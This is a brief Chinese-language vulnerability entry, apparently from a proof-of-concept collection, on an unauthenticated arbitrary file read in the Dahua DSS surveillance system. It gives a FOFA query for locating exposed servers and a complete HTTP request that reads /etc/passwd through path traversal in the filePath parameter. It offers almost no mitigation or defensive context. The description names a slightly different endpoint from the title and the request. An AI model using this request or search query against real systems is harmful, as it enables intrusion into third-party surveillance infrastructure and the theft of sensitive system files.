# 大华DSS数字监控系统attachment_downloadAtt.action任意文件读取漏洞

大华DSS数字监控系统 attachment_downloadByUrlAtt.action接口存在任意文件读取漏洞，未经身份验证的远程攻击者 可以利用此漏洞获取系统内部敏感文件信息，使系统处于极不安全的状态。

## fofa

```java
app="dahua-DSS"
```

## poc

```javascript
GET /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
```

![image-20241211211500395](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412112115457.png)